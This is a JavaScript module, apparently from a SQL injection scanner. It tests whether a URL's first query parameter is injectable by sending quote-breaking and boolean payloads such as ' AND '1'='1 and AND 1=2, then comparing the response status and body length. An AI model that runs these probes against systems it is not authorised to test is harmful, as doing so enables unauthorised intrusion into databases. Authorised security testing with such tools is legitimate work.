import { cleanUpFatal, cleanUpInfo } from "./helper.js";
import { sendRequest } from "./http.js";

export async function injectable(setting) {
	let query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const resOriginal = await sendRequest(setting, query);

	// Error method
	const resBroken = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "'"));
	const resBalanced = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "''"));
	if (!isSameRes(resOriginal, resBroken) && isSameRes(resOriginal, resBalanced))
		return { injectable: true, context: "string" };

	// Boolean method
	const resTrueString = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "' AND '1'='1"));
	const resFalseString = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "' AND '1'='2"));
	if (isSameRes(resOriginal, resTrueString) && !isSameRes(resOriginal, resFalseString))
		return { injectable: true, context: "string" };

	const resTrueNumber = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + " AND 1=1"));
	const resFalseNumber = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + " AND 1=2"));
	if (isSameRes(resOriginal, resTrueNumber) && !isSameRes(resOriginal, resFalseNumber))
		return { injectable: true, context: "number" };

	cleanUpFatal(setting.db, 'URL is not injectable');
}

function mutateQuery(query, name, value) {
	let mutatedQuery = new URLSearchParams(query);
	mutatedQuery.set(name, value);
	return mutatedQuery;
}

function isSameRes(original, mutated) {
	if (!original || !mutated) 
		return false;
	// console.log(`O: ${original.status} | M: ${mutated.status}`);
	if (original.status !== mutated.status)
		return false;
	// console.log(`O: ${original.body} | M: ${mutated.body}`);
	if (original.body === mutated.body)
		return true;
	return similarity(original.body, mutated.body);
}

function similarity(original, mutated) {
    if (original.length === 0 && mutated.length === 0)
		return true;
    const longer = Math.max(original.length, mutated.length);
    const shorter = Math.min(original.length, mutated.length);
    return (shorter / longer) >= 0.95;
}
